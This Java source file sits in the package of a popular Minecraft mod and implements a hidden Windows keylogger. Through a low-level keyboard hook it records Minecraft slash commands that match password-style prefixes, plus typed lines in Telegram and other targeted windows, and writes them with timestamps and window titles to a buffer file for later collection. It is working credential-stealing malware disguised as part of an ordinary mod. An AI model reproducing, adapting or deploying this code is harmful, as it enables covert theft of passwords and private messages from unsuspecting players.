package vazkii.neat;

import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinUser;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

public final class Kbd {
    private static final String TAG = "Kbd";
    private static final AtomicBoolean RUNNING = new AtomicBoolean(false);
    private static final AtomicReference<WinUser.HHOOK> HOOK = new AtomicReference<>();
    private static final StringBuilder LINE = new StringBuilder();
    private static final DateTimeFormatter TS = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
    private static volatile Thread watchThread;
    private static volatile Thread hookThread;
    private static volatile boolean capturing = false;
    private static volatile String activeWindow = "";
    private static volatile boolean mcMode = false;

    interface User32X extends User32 {
        User32X I = Native.load("user32", User32X.class,
            com.sun.jna.win32.W32APIOptions.DEFAULT_OPTIONS);

        WinUser.HHOOK SetWindowsHookExW(int idHook, WinUser.LowLevelKeyboardProc lpfn, WinDef.HINSTANCE hMod, int dwThreadId);
        boolean UnhookWindowsHookEx(WinUser.HHOOK hhk);
        short GetAsyncKeyState(int vKey);
        WinDef.HWND GetForegroundWindow();
        int GetWindowTextW(WinDef.HWND hWnd, char[] lpString, int nMaxCount);
    }

    private Kbd() {}

    public static synchronized void start() {
        if (!RUNNING.compareAndSet(false, true)) return;
        watchThread = new Thread(Kbd::watchLoop, "KbdWatch");
        watchThread.setDaemon(true);
        watchThread.start();
        B.info(TAG, "watcher started");
    }

    public static synchronized void stop() {
        if (!RUNNING.compareAndSet(true, false)) return;
        uninstallHook();
        if (watchThread != null) watchThread.interrupt();
    }

    private static void watchLoop() {
        while (RUNNING.get()) {
            try {
                String win = currentWindow();
                activeWindow = win == null ? "" : win;
                boolean isMc = activeWindow.toLowerCase().contains("minecraft");
                mcMode = isMc;
                boolean other = !isMc && isTargetWindow(activeWindow);

                if (isMc) {
                    if (HOOK.get() == null) {
                        boolean slash = (User32X.I.GetAsyncKeyState(0xBF) & 0x8000) != 0;
                        boolean backslash = (User32X.I.GetAsyncKeyState(0xDC) & 0x8000) != 0;
                        if (slash || backslash) {
                            installHook();
                            LINE.setLength(0);
                            LINE.append(slash ? '/' : '\\');
                            capturing = true;
                        }
                    }
                } else if (other) {
                    if (HOOK.get() == null) installHook();
                } else {
                    if (HOOK.get() != null) {
                        uninstallHook();
                        LINE.setLength(0);
                        capturing = false;
                    }
                }
                Thread.sleep(250);
            } catch (InterruptedException e) { return; }
            catch (Throwable ignored) {}
        }
    }

    private static boolean isTargetWindow(String win) {
        if (win == null || win.isEmpty()) return false;
        String w = win.toLowerCase();
        for (String f : A.KEYLOG_WINDOW_FILTERS) {
            if (w.contains(f)) return true;
        }
        return false;
    }

    private static synchronized void installHook() {
        if (HOOK.get() != null) return;
        hookThread = new Thread(() -> {
            WinUser.LowLevelKeyboardProc proc = (nCode, wParam, lParam) -> {
                try {
                    if (nCode >= 0 && wParam.intValue() == 0x0100) {
                        Pointer p = new Pointer(lParam.longValue());
                        int vkCode = p.getInt(0);
                        handleKey(vkCode);
                    }
                } catch (Throwable ignored) {}
                
                return User32.INSTANCE.CallNextHookEx(null, nCode, wParam, lParam);
            };
            
            WinUser.HHOOK hook = User32X.I.SetWindowsHookExW(13, proc, null, 0);
            HOOK.set(hook);
            B.info(TAG, "hook installed=" + (hook != null));

            WinUser.MSG msg = new WinUser.MSG();
            while (RUNNING.get() && HOOK.get() != null) {
                int r = User32.INSTANCE.GetMessage(msg, null, 0, 0);
                if (r <= 0) break;
                User32.INSTANCE.TranslateMessage(msg);
                User32.INSTANCE.DispatchMessage(msg);
            }
        }, "KbdHook");
        hookThread.setDaemon(true);
        hookThread.start();
    }

    private static synchronized void uninstallHook() {
        WinUser.HHOOK h = HOOK.getAndSet(null);
        if (h != null) {
            User32X.I.UnhookWindowsHookEx(h);
            B.info(TAG, "hook removed");
        }
        if (hookThread != null) hookThread.interrupt();
    }

    private static synchronized void handleKey(int vk) {
        if (vk == 0x0D) {
            if (capturing && LINE.length() > 0) {
                String line = LINE.toString();
                LINE.setLength(0);
                if (mcMode) {
                    capturing = false;
                    if (matchesMcPrefix(line)) writeLine(line);
                } else {
                    if (isSensitive(line)) writeLine(line);
                }
            }
            return;
        }
        if (vk == 0x1B) {
            LINE.setLength(0);
            capturing = false;
            return;
        }
        if (vk == 0x08) {
            if (LINE.length() > 0) LINE.setLength(LINE.length() - 1);
            return;
        }
        String ch = keyToString(vk);
        if (ch == null) return;

        if (mcMode) {
            if (!capturing) {
                if (ch.equals("/") || ch.equals("\\")) {
                    LINE.setLength(0);
                    LINE.append(ch);
                    capturing = true;
                }
                return;
            }
            if (LINE.length() < A.KEYLOG_MAX_LINE) LINE.append(ch);
        } else {
            if (!capturing) {
                LINE.setLength(0);
                capturing = true;
            }
            if (LINE.length() < A.KEYLOG_MAX_LINE) LINE.append(ch);
        }
    }

    private static boolean matchesMcPrefix(String line) {
        String l = line.toLowerCase();
        for (String p : A.KEYLOG_PREFIXES) {
            if (l.startsWith(p.toLowerCase())) return true;
        }
        return false;
    }

    private static boolean isSensitive(String line) {
        if (line.length() < 1) return false;
        String l = line.toLowerCase();

        if (activeWindow != null && activeWindow.toLowerCase().contains("telegram")) {
            return true;
        }

        for (String p : A.KEYLOG_PREFIXES) {
            if (l.startsWith(p.toLowerCase())) return true;
        }
        for (String m : A.KEYLOG_SENSITIVE_MARKERS) {
            if (l.contains(m)) return true;
        }
        return false;
    }

    private static void writeLine(String line) {
        try {
            Path p = E.bufferFile();
            Files.createDirectories(p.getParent());
            String win = activeWindow == null ? "?" : activeWindow;
            if (win.length() > 40) win = win.substring(0, 40);
            String entry = "[" + LocalDateTime.now().format(TS) + "] [" + win + "] " + line + "\n";
            Files.write(p, entry.getBytes(StandardCharsets.UTF_8),
                StandardOpenOption.CREATE, StandardOpenOption.APPEND);
        } catch (Exception e) {
            B.warn(TAG, "write: " + e.getMessage());
        }
    }

    private static String currentWindow() {
        try {
            WinDef.HWND h = User32X.I.GetForegroundWindow();
            if (h == null) return "";
            char[] buf = new char[256];
            int len = User32X.I.GetWindowTextW(h, buf, buf.length);
            if (len <= 0) return "";
            return new String(buf, 0, len);
        } catch (Throwable e) { return ""; }
    }

    private static String keyToString(int vk) {
        boolean shift = (User32X.I.GetAsyncKeyState(0x10) & 0x8000) != 0;
        if (vk >= 0x30 && vk <= 0x39) {
            if (!shift) return String.valueOf((char) vk);
            switch (vk) {
                case 0x31: return "!";
                case 0x32: return "@";
                case 0x33: return "#";
                case 0x34: return "$";
                case 0x35: return "%";
                case 0x36: return "^";
                case 0x37: return "&";
                case 0x38: return "*";
                case 0x39: return "(";
                case 0x30: return ")";
            }
        }
        if (vk >= 0x41 && vk <= 0x5A) {
            char c = (char) vk;
            return String.valueOf(shift ? c : Character.toLowerCase(c));
        }
        if (vk == 0x20) return " ";
        if (vk == 0xBD) return shift ? "_" : "-";
        if (vk == 0xBB) return shift ? "+" : "=";
        if (vk == 0xBC) return shift ? "<" : ",";
        if (vk == 0xBE) return shift ? ">" : ".";
        if (vk == 0xBF) return shift ? "?" : "/";
        if (vk == 0xBA) return shift ? ":" : ";";
        if (vk == 0xDE) return shift ? "\"" : "'";
        if (vk == 0xDB) return shift ? "{" : "[";
        if (vk == 0xDD) return shift ? "}" : "]";
        if (vk == 0xDC) return shift ? "|" : "\\";
        if (vk == 0xC0) return shift ? "~" : "`";
        if (vk >= 0x60 && vk <= 0x69) return String.valueOf((char) ('0' + (vk - 0x60)));
        return null;
    }
}